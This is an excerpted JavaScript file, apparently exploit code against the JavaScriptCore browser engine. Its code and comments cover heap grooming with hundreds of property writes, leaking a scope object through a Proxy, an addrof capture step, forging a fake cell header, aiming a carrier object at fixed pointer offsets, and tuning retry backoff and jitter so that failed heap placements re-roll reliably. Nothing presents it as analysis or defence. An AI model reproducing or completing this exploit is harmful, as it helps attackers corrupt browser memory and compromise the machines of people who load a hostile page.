...
/*
The delays actually used for the attempt now running. startAttempt() sets these
from the constants above (jittered from attempt 2 onward) so a retry is not a
byte-identical repeat of the attempt that just failed.
*/
...
/*
How long we have waited, in total, before the attempt now running. Each retry
adds to it (see retryDelayMs) so a heap that keeps coming back mis-shaped gets
progressively more time to settle instead of being re-rolled at the same speed
that just failed.
*/
let retryWaitMs = 0;
...
function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped)
        return;
    /*
    SECOND GATE -- MUST AGREE WITH loadHistoryCritical's FIRST ONE.

    loadHistoryCritical now classifies a NON-ZERO but structurally invalid header
    as retrySafe too (HEADER-JUNK-MISS), proving that a live run hits exactly
    that: the clone returns some object other than the carrier, the 8 bytes read
    are that object's first word, and nothing observable has happened yet.

    This gate still demanded `zeroHeaderMiss`, so that newly-retrySafe miss then
    reached here and was rejected -- falling through to failed() (flat 50 ms)
    instead of the escalating backoff, and logging the contradictory pair
    `retry-safe=true ... candidate-state-safe=false` the live run showed.

    Both gates are really asking one question: did anything observable happen
    that makes a re-roll unsafe? That is exactly `candidateMutationStarted`
    (cleared only when we have begun writing through the fake cell) plus the
    vector-touch flag the header path already gated on. A header that failed
    rwHeaderOK never got as far as touching the vector, so once
    candidateMutationStarted is false there is nothing to protect -- regardless
    of whether the junk read was all-zero or non-zero.
    */
    ...
    This was a flat Math.max(AUTO_RETRY_DELAY_MS, 750). Two problems with that:

      1. releaseAttemptAllocations() just dropped the carrier (CARRIER_SLOTS x
         8 bytes, ~96 MB by default). That memory is garbage the moment it is
         unreferenced, and JSC only sweeps when it gets round to it. Re-rolling
         750 ms later can land inside the collector, so the next attempt builds
         its graph against a heap that is actively moving -- which is exactly
         the shape of a rare, unrepeatable miss.
      2. Every retry waited the SAME 750 ms, so a heap that came back mis-shapen
         was re-rolled at the speed that had just failed, with no change.

    Grow the wait per attempt (750, 1125, 1500 ... capped), so each retry gives
    the sweeper strictly more room than the one before. Overridable with
    ?retryms= for a fixed value and ?backoff=N to scale the growth (N=0 keeps a
    flat ?retryms=, N=2 makes it grow twice as fast).
    */
    ...
    setTimeout(() => {
        /* Same question as the two gates above: has anything observable happened?
           Use !candidateMutationStarted rather than the stale zeroHeaderMiss-only
           test, or a HEADER-JUNK-MISS retry gets cancelled here. */
...
function startAttempt() {
    ...
    if (fakeReleased)
        return;
    /*
    DELIBERATE: stopped is cleared here (as well as in establishPrimitive and
    failed()). scheduleSafeRetry's timeout is the one path into startAttempt that
    did not clear it, so a retry that followed a transient stop could return
    immediately and look like a silently dropped attempt.
    */
    stopped = false;
    resetAttemptState();
    /*
    ...
    Every attempt used the same CARRIER_SLOTS, CAPTURE_DELAY_MS and
    COMPOSE_DELAY_MS, so a heap shape that defeated attempt 1 defeated attempts
    2..N the same way -- identical re-rolls of a losing configuration. Nudge the
    two delays by a small per-attempt amount so successive attempts sample
    slightly different collector/compiler timing. ?jitter=0 disables it, ?jitter=N
    scales it (percent of the base delay).
    */
    ...
    if (jitterPct > 0 && attemptNumber > 1) {
        /* deterministic per attempt -- no Math.random, so a repeat of the same
           attempt number reproduces exactly and stays debuggable */
...
function prepareSymbolWrapper(F) {
    ...
    /*
    NO READ-BACK PROBES HERE -- and that is deliberate.

    Two guards were tried at this point and BOTH broke the primitive:

      a) hasOwnProperty.call(leakedScope, key)  -> TypeError, because
         leakScopeObject() returns the Proxy's *receiver*, not a plain object,
         and the trap hands back undefined for that lookup.
      b) reading back the values just written (leakedScope.p0 etc.) -> the same
         Proxy get trap intercepts the read, so it can never return the stored
         integers, and the guard rejected every attempt.

    The 520 writes below are a HEAP-GROOMING side effect, not a data dependency:
    nothing in this function or downstream reads these properties back. The
    original code worked precisely because it only ever WROTE. Validating them
    with a read is not possible on this object, so validation was removed rather
    than left in a form that fails on every run.

    The one check that is both meaningful and safe stays: the leak must have
    produced something non-null (above).
    */
    for (let i = 0; i < 512; i++)
        leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++)
    ...
    An earlier draft asserted Object(leakedScope.g) is a [object Symbol]. That is
    wrong for this design and would have thrown on every attempt: F is
    getterCarrierFunction, which `return 7`, so `leakedScope.g` evaluates to 7 and
    Object(7) is a Number object. Symbol.prototype.toString is then called on it
    by runAddrofCapture, and whatever it produces (or throws) is the capture step's
    business -- it already has its own try/catch and sets captureState = -1.

    So the return value is passed through unvalidated, exactly as before.
    */
...
function buildFakeHost() {
    ...
    /*
    SHAPE GUARD 4. The three deletes above are load-bearing: they force fakeHost
    into the dictionary/deleted-slot layout whose q0 sits where the forged header
    is read from and whose q2/q3 sit at the offsets the later aimCarrier() steps
    overwrite. Nothing verified that the transition actually happened -- the check
    above only re-reads the VALUES, which survive in either layout.

    The observable difference is property ORDER: in the dense layout the deleted
    keys still occupy their slots and come back in insertion order (q0, q2, q3),
    while a re-interned/dictionary object can return them in a different order.
    Verify the surviving keys enumerate as exactly [q0, q2, q3] in that order. A
    mismatch means this object will not be aimed correctly, so fail now (which
    re-rolls) instead of corrupting a later stage.
    */
    ...
    /*
    SHAPE GUARD 5. Placed AFTER targetHolder is assigned, where the six slots
    exist: an earlier draft ran it before the literal and Object.keys(null)
    threw on every attempt. All six slots must be densely present and enumerate
    in insertion order, because the holder read walks them at fixed 8-byte
    strides (0x10, 0x18, 0x20, 0x28, 0x30, 0x38) and treats each as a pointer.
    A sparse or reordered holder silently shifts every pointer.
    */
...
function loadHistoryCritical() {
    ...
    try {
        ...
        if (!rwHeaderOK) {
            ...
            This used to accept only an ALL-ZERO header as a retryable
            placement miss:

                zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
                retrySafe = zeroHeaderMiss && ...

            A live run proved that too narrow. It produced a NON-ZERO but
            structurally invalid header (0xa9260000...) -- the clone had
            returned some object other than the carrier, so the 8 bytes read
            here were that object's first word, not a cell header. That is the
            same class of event as an all-zero read: the placement missed.
            Because it was not all-zero, retrySafe stayed false, the run was
            reported as VALIDATION-MISMATCH (alarming, and wrong -- nothing
            was validated, the HEADER was junk), and it left through failed()
            instead of the backoff path, so the escalating retry delay never
            applied to it.

            Widen it: any header that fails rwHeaderOK is a miss, provided we
            have not touched the vector and have not started mutating the
            candidate. Both are already conditions of the old expression, and
            both mean "nothing observable happened yet", which is what makes a
            re-roll safe. zeroHeaderMiss is still computed and reported, so the
...
function reportComposition() {
    ...
    if (compositionState === 3) {
        /*
        TAG ORDER MATTERS. A junk header is now retrySafe (see loadHistoryCleared),
        so the old `retrySafe ? COMPOSITION-LENGTH-MISS : VALIDATION-MISMATCH`
        would have reported a garbage carrier header as a length miss -- the same
        kind of misleading label this whole change exists to remove.

        headerJunkMiss is checked before retrySafe so the three genuinely
        different events stay distinguishable:
          ZERO-HEADER-MISS   the clone handed back all-zero bytes (placement
                             miss, most benign)
          HEADER-JUNK-MISS   the clone handed back a live object that is not the
                             carrier -- non-zero but not a valid cell header
          VALIDATION-MISMATCH a real validation failure (not retrySafe)
        */
